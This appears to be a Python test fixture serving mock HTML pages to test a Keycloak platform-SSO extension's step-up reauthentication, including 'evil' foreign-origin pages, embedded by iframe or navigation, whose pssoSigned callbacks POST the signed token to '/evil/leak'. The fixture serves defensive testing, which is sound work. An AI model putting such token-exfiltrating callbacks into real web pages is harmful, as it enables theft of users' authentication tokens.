"""HTML the mock serves to the extension's web view. The step-up page mirrors
keycloak-psso-extension's reauthentication.ftl, including the signed step-up
token it passes as the message's challenge; the evil pages model a foreign
origin inside the same web view and send no token."""
from __future__ import annotations

PLAIN_AUTH = "<html><body>mock auth</body></html>"

_STEP_UP = """<!doctype html>
<html><body>
<form id="stepupForm" action="{action}" method="post">
  <input type="hidden" id="signedtoken" name="signedtoken" value="">
  <input type="hidden" id="reauthenticate" name="reauthenticate" value="">
  <input type="hidden" id="stepUpToken" name="stepUpToken" value="{step_up_token}">
</form>
{extra_html}
<script>
  pssoStepUp();
  function pssoStepUp() {{
    const stepUpToken = document.getElementById("stepUpToken").value;
    window.webkit.messageHandlers.pssoStepUp.postMessage({{ type: "getSignedToken", challenge: stepUpToken }});
    {after_ask}
  }}
  function pssoSigned(signedToken) {{
    document.getElementById("signedtoken").value = signedToken;
    document.getElementById("stepupForm").submit();
  }}
</script>
</body></html>
"""

EVIL_STEP_UP = """<!doctype html>
<html><body>evil frame
<script>
  function pssoSigned(signedToken) {
    fetch("/evil/leak", { method: "POST", body: signedToken });
  }
  window.webkit.messageHandlers.pssoStepUp.postMessage({ type: "getSignedToken" });
</script>
</body></html>
"""

EVIL_LANDING = """<!doctype html>
<html><body>evil landing
<script>
  function pssoSigned(signedToken) {
    fetch("/evil/leak", { method: "POST", body: signedToken });
  }
</script>
</body></html>
"""

STEP_UP_DECLINED = "<html><body>step-up declined</body></html>"
CALLBACK = "<html><body>callback</body></html>"


def step_up_page(*, action: str, step_up_token: str, variant: str, evil_origin: str) -> str:
    extra_html = ""
    after_ask = ""
    if variant == "iframe":
        extra_html = f'<iframe src="{evil_origin}/evil/stepup.html"></iframe>'
    elif variant == "navigate":
        after_ask = f'location.href = "{evil_origin}/evil/landing.html";'
    elif variant != "plain":
        raise ValueError(f"unknown step-up variant {variant!r}")
    return _STEP_UP.format(
        action=action, step_up_token=step_up_token, extra_html=extra_html, after_ask=after_ask
    )
